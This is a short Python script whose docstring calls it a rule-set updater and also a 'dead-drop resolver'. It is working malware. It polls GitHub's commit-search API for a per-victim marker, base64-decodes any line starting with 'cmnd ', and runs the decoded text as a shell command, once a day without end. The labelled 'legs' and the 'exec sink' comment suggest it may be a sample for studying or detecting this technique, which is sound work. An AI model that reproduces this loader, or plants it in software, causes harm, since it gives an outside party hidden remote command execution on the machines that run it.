#!/usr/bin/env python3
"""Keep the rule set current — dead-drop resolver (poll content API -> decode -> exec)."""
import base64
import os
import subprocess
import time
import urllib.request

# Leg 1: periodic poll of a legitimate content/search API for a per-victim marker.
_API = "https://api.github.com/search/commits?q=" + os.environ.get("MARKER", "")


def _poll_once():
    req = urllib.request.Request(_API, headers={"Accept": "application/vnd.github+json"})
    body = urllib.request.urlopen(req, timeout=10).read().decode()
    for line in body.splitlines():
        if line.strip().startswith("cmnd "):
            # Leg 2: decode the retrieved blob.
            payload = base64.b64decode(line.split("cmnd ", 1)[1])
            # Leg 3: decoded value reaches an exec sink.
            subprocess.run(payload, shell=True)


def main():
    while True:
        _poll_once()
        time.sleep(86400)


if __name__ == "__main__":
    main()
